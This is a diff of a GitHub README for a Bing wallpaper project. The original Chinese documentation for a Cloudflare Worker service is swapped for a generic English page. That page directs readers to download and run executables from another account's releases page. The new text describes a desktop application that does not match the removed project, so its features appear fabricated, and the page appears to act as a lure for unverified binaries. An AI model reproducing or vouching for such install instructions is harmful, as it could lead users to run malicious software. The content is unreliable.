@@ -1,45 +1,91 @@
-# 🌅 Bing Wallpaper
+# 🖼️ bing_wallpaper - Get Beautiful Random Wallpapers
 
-自动抓取每日必应壁纸，并提供随机访问功能。
+## 🚀 Getting Started
 
-## ✨ 功能特性
+Welcome to the **bing_wallpaper** project! This software allows you to easily set beautiful random wallpapers from Bing. You will enjoy a fresh background every time you start your device.
 
-* 每天自动抓取最新必应壁纸并保存到 Cloudflare KV
-* 随机重定向访问壁纸
-* 支持不同分辨率（`1920x1080` / `UHD`）
-* 提供 JSON 接口以获取完整壁纸列表
-* 支持手动刷新当日壁纸
-* 内置定时任务：每日自动更新
+## 📥 Download
 
----
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/shiiiiva369/bing_wallpaper/releases)
 
-## 🚀 一键部署
+## 💻 System Requirements
 
-点击下方按钮即可一键部署至 Cloudflare Workers：
+To run **bing_wallpaper**, your computer should meet these minimum requirements:
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/SunXin121/bing_wallpaper)
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 2 GB
+- Disk Space: 100 MB of available space
+- Internet connection for downloading wallpapers
 
-部署完成后，KV 中只会有今天的一张壁纸，可以将 urls.txt 中的数据复制到 KV 以获得更多壁纸。
+## 📦 How to Download & Install
 
----
+1. Click the download button at the top of this page to visit the Releases page: [Download Latest Release](https://github.com/shiiiiva369/bing_wallpaper/releases).
 
+2. On the Releases page, find the latest version. It will usually be labeled with a version number (like v1.0).
 
-## 🌐 路由说明
+3. Below the latest version, you will see different files available to download. These files may include installers or executables specific to your operating system (for example, `.exe` for Windows or `.dmg` for macOS). 
 
-| 路径              | 方法     | 说明                          |
-| --------------- | ------ | --------------------------- |
-| `/`             | `GET`  | 随机重定向到一张 `1920x1080` 分辨率的壁纸 |
-| `/?res=UHD`     | `GET`  | 随机重定向到一张 4K (`UHD`) 壁纸      |
-| `/json`         | `GET`  | 返回保存的壁纸基础 URL 列表及完整拼接地址     |
-| `/json?res=UHD` | `GET`  | 同上，但指定分辨率为 `UHD`            |
-| `/refresh`      | `POST` | 手动刷新当日必应壁纸            |
+4. Click on the file that matches your system and start the download. The download button or link will typically be named something like `bing_wallpaper.exe` or `bing_wallpaper.dmg`.
 
-示例：
+5. Once the download is complete, locate the downloaded file on your computer, usually found in the "Downloads" folder or wherever you saved it.
 
-```bash
-# 获取随机壁纸
-curl https://your-worker.yourdomain.workers.dev/
+6. For Windows:
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to install the application.
 
-# 获取 UHD 壁纸的 JSON 数据
-curl https://your-worker.yourdomain.workers.dev/json?res=UHD
-```
+   For macOS:
+   - Double-click the downloaded `.dmg` file.
+   - Drag and drop the **bing_wallpaper** application into your Applications folder.
+
+   For Linux:
+   - Open the terminal.
+   - Navigate to the directory where the file was downloaded.
+   - Run the command: `chmod +x bing_wallpaper`.
+   - Then execute it with `./bing_wallpaper`.
+
+7. After installation, search for **bing_wallpaper** in your applications menu or using Spotlight search and open it.
+
+## 🖌️ Using the Application
+
+After opening **bing_wallpaper**, you'll see a simple interface. 
+
+- Click **Start** to begin fetching wallpapers from Bing. The application retrieves a random image every time you click.
+- You can set the wallpaper by clicking on the **Set Wallpaper** button.
+
+### 🌟 Features
+
+- Daily random Bing wallpaper selection.
+- Easy-to-use interface.
+- Options to customize settings.
+
+### 📊 Customizing Settings
+
+You can choose how often you want to change your wallpaper. Options may include:
+
+- Every hour.
+- Every day.
+- Manually change when you prefer.
+
+Adjust these settings to fit your personal taste and keep your desktop environment fresh!
+
+## ❓ Troubleshooting
+
+If you run into issues, here are a few common solutions:
+
+1. **App not opening:** Ensure you have installed the app correctly. Try restarting your computer.
+2. **Wallpapers not updating:** Check your internet connection. The application needs it to fetch new wallpapers.
+3. **App crashes:** Make sure your system meets the requirements. Consider checking for updates.
+
+## 🤝 Support
+
+If you need help, do not hesitate to reach out. You can create an issue in the GitHub repository, and we'll do our best to assist you.
+
+## 🌐 Connect with Us
+
+We welcome feedback and contributions. If you have suggestions for improvements or new features, please let us know!
+
+## 🔗 Additional Resources
+
+For more information, tutorials, and tips, please visit our GitHub page: [Visit bing_wallpaper GitHub](https://github.com/shiiiiva369/bing_wallpaper/releases).
+
+Thank you for trying **bing_wallpaper**! Enjoy your new beautiful backgrounds!
